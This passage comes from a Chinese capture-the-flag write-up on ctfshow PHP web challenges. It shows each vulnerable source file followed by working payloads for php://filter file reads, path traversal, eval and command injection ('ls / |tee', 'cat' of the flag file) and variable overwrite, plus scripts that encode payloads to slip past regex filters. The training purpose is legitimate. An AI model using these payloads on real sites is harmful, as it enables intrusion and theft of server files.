class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>要求</strong>：v1，v2 不能包含特殊符号与数字，v1 必须包含 ctfshow</p>
<p><strong>分析</strong>：</p>
<p>　　1、getFlag 中使用 var_dump() 输出 $$v1</p>
<p>　　　　$$v1 &#x3D; &amp;$$v2</p>
<p>　　　　$v2 为变量，我们知道，flag 通常存储在 $flag 变量中，因此，令 v2 &#x3D; flag，则相当于 $$v1 &#x3D; $flag</p>
<p>　　　　构造的 payload 为 v1&#x3D;ctfshow&amp;v2&#x3D;flag</p>
<p>　　　　但输出为 NULL</p>
<p>　　　　<strong>原因</strong>：（变量范围）</p>
<p>　　　　　　$flag 在自定义函数 getFlag 函数中没有定义</p>
<p>　　　　　　$flag 是属于 flag.php 中的变量，对于 getFlag 是外部变量，因此我们需要将 $flag 改为全局变量</p>
<p>　　2、定义全局变量的格式为 global $flag</p>
<p>　　　　如果 v2&#x3D;global $flag</p>
<p>　　　　首先 $ 被屏蔽</p>
<p>　　　　其次 $$v1 &#x3D; &amp;$$v2 ，既 $$v1 &#x3D; &amp;$global $flag</p>
<p>　　3、考虑使用超全局变量 $GLOBALS</p>
<p><strong>知识点</strong></p>
<p>　　1、引用赋值 &amp;</p>
<p>　　2、变量范围</p>
<p>　　3、预定义变量中的超全局变量 $GLOBALS</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>

<h4><span id="web112">web112</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>

<h4><span id="web113">web113</span></h4><p>考点：利用函数所能处理的长度限制进行目录溢出</p>
<ul>
<li>解法一</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/p</span><br><span class="line">roc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/pro</span><br><span class="line">c/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/</span><br><span class="line"><span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/se</span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>解法二</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>

<h4><span id="web123">web123</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中$c&lt;&#x3D;18不知道是啥意思</p>
<p>php是弱类型语言，因此如果字符串开头是字母，和数字比较时候就会被转为0</p>
<ul>
<li><p>方法一：利用eval$c直接输出结果</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="built_in">echo</span> $flag</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Payload：</span><br><span class="line"> </span><br><span class="line">GET：?a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line">                   </span><br><span class="line">GET:?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<blockquote>
<p>利用$_SERVER[‘argv’]，在大佬那看了这一函数的讲解。</p>
<p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p>
<p>‘argv’</p>
<p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p>
<p>意思就是通过$_SERVER[‘argv’]将$a变成数组，再利用数组的性质将fl0g&#x3D;flag_give_me传入，同时还绕过第一个if中的!isset($_GET[‘fl0g’]))，用+来进行分隔，使得数组中有多个数值。</p>
<p>执行eval函数也就是执行$c即是parse_str($a[1])，使得fl0g&#x3D;flag_give_me，从而进入第三个if语句。</p>
</blockquote>
<p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p>
</li>
<li><p>方法三：highlight_file</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Payload：</span><br><span class="line"> </span><br><span class="line">GET：?<span class="number">1</span>=flag.php</span><br><span class="line"> </span><br><span class="line">POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="web127">web127</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>小知识点： _()是一个函数</p>
<p>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p>
<p>get_defined_vars()函数</p>
<p>get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag</p>
<p>payload: ?f1&#x3D;_&amp;f2&#x3D;get_defined_vars</p>
<h4><span id="web129">web129</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 03:18:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题是让我们读取flag,当时我们传入的值必须包括ctfshow而且不能出现在开头,第一反应就是用filter伪协议读取,中间把ctfshow替换成过滤器的名称<code>php://filter/ctfshow/resource=flag.php</code>,或者目录遍历也可以</p>
<ul>
<li><p>方法一：filter</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?f=php:<span class="comment">//filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br><span class="line">?f=php:<span class="comment">//filter/|ctfshow/resource=flag.php</span></span><br><span class="line">?f=php:<span class="comment">//filter/ctfshow/resource=flag.php</span></span><br><span class="line">具体原理也不是很清楚,可能是php遇到没有的filter就会忽略</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：目录绕过</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?f=/ctfshow/../../../../var/www/html/flag.php</span><br><span class="line">?f=./ctfshow/../flag.php</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="web131">web131</span></h4><p><a target="_blank" rel="noopener" href="https://www.laruence.com/2010/06/08/1579.html">正则最大回溯</a></p>
<h4><span id="web134">web134</span></h4><p>解答：看到parse_str和extract。变量覆盖<br>第一条if判断，要求key1和key2不能通过get和post传递。</p>
<p>parse_str是对get请求进行的内容解析成变量。例如传递?a&#x3D;1，执行后就是$a&#x3D;1。<br>那么相对的，传递_POST，就是对$_POST进行赋值，正好就可以绕过if条件对post的限制。<br>extract() 函数从数组中将变量导入到当前的符号表。</p>
<p><code>payload：?_POST[key1]=36d&amp;_POST[key2]=36d</code></p>
<h4><span id="web136">web136</span></h4><p><code>tee</code>用于显示程序的输出并将其复制到一个文件中。</p>
<p><strong>payload</strong>：<code>?c=ls |tee 1</code>，访问1发现当前目录没有flag文件。</p>
<p><code>?c=ls / |tee 1</code>，发现f149_15_h3r3文件。</p>
<p><code>?c=cat /f149_15_h3r3|tee 1</code>获取flag。</p>
<h4><span id="web141">web141</span></h4><p>数字和运算符是可以一起执行命令的，如1+phpinfo()+1;是可以显示phpinfo页面的，GET传入的只是字符串“1+phpinfo()+1”;是不能直接执行命令的，经过eval处理后就变成了可以执行命令，if(preg_match(‘&#x2F;^\W+$&#x2F;‘, $v3)){的存在我们只能传入非数字字母，不过php7可以用（‘phpinfo’)()动态调用函数，可以用异或绕过</p>
<p>需要通过脚本绕过</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">php脚本</a></p>
<p>v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;%2b（+号）或者%2d（-号）加上脚本编码后的字符串。</p>
<ul>
<li><p><strong>取反</strong></p>
<p>因为取反的话，基本上用的都是一个不可见字符，所以不会触发到正则表达式</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>异或和或操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/16 10:23</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/4/26 18:56</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">op_dict = &#123;</span><br><span class="line">    <span class="string">&quot;yes_op&quot;</span>: <span class="keyword">lambda</span> x: x,</span><br><span class="line">    <span class="string">&quot;not_op&quot;</span>: <span class="keyword">lambda</span> x: <span class="keyword">not</span> x,</span><br><span class="line">    <span class="string">&quot;or_op&quot;</span>: <span class="keyword">lambda</span> x, y: x | y,</span><br><span class="line">    <span class="string">&quot;xor_op&quot;</span>: <span class="keyword">lambda</span> x, y: x ^ y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sign = &#123;</span><br><span class="line">    <span class="string">&#x27;xor_op&#x27;</span>: <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;or_op&#x27;</span>:<span class="string">&#x27;|&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_coding</span>(<span class="params">file_name, pattern, is_match, mode</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成符合要求的编码</span></span><br><span class="line"><span class="string">    @param file_name: 生成文件的名称</span></span><br><span class="line"><span class="string">    @param pattern: 正则表达式</span></span><br><span class="line"><span class="string">    @param is_match: 是否匹配正则，True表示匹配，False表示不匹配</span></span><br><span class="line"><span class="string">    @param mode: 编码方式</span></span><br><span class="line"><span class="string">    @return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                op = op_dict[<span class="string">&#x27;not_op&#x27;</span>] <span class="keyword">if</span> is_match <span class="keyword">else</span> op_dict[<span class="string">&#x27;yes_op&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 如果当前外层循环元素被过滤了，直接跳过所有内层循环</span></span><br><span class="line">                <span class="keyword">if</span> op(re.search(pattern, <span class="built_in">chr</span>(i))):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="comment"># 如果当前内层循环元素被过滤了，跳过该元素</span></span><br><span class="line">                <span class="keyword">if</span> op(re.search(pattern, <span class="built_in">chr</span>(j))):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># [2:]是因为python中hex表示是0xff这样的形式，去掉前面的0x，组成2位url编码</span></span><br><span class="line">                hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">if</span> i &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                hex_j = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:] <span class="keyword">if</span> j &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="comment"># url编码的方式和ASCII码一样，但需要在前面加上%</span></span><br><span class="line">                url_i = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span 